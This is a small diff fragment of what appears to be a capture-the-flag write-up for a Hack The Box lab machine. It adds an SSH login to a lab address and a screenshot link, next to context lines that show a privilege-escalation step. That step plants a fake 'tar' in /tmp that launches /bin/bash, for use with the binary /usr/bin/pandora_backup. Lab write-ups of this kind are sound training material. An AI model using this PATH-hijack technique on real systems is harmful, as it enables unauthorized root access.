@@ -78,6 +78,12 @@ cat .ssh/id_rsa.pub
 
 
 ```
+ssh matt@10.10.11.136
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/8a869095-c97f-48ed-8b60-b52de43c8a34)
+
+
+```
 /usr/bin/pandora_backup
 echo "/bin/bash" > /tmp/tar
 chmod +x /tmp/tar
